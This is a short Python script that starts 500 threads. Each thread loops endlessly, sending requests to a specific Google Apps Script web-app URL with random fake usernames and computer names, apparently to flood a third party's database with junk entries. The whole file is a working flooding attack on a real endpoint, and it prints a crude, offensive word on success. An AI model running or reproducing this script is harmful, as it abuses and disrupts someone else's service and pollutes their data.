import requests
import urllib.parse
import os
import random
import string
import threading
def INDIAUP(length=5):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def boom():
  while True:
    username = f"FillTheDbUP_{INDIAUP()}"
    compName = f"CRACKEDLMAO_{INDIAUP()}"
    encodedUser = urllib.parse.quote(username)
    encodedPC = urllib.parse.quote(compName)
    fullURL = f"https://script.google.com/macros/s/AKfycbys_0dn2UPA4fXqNgqqYIHnUxoDUIusA8BoIVSghSJ8BR7colxlDEYLhqvv4OVCE6Is/exec?username={encodedUser}&computer={encodedPC}"
    response = requests.get(fullURL)
    if response.status_code == 200:
        print("rapered", response.text)
    else:
      pass

def sigmarizzler(num_threads=10):
    threads = []
    
    for _ in range(num_threads):
        thread = threading.Thread(target=boom)
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

sigmarizzler(500)
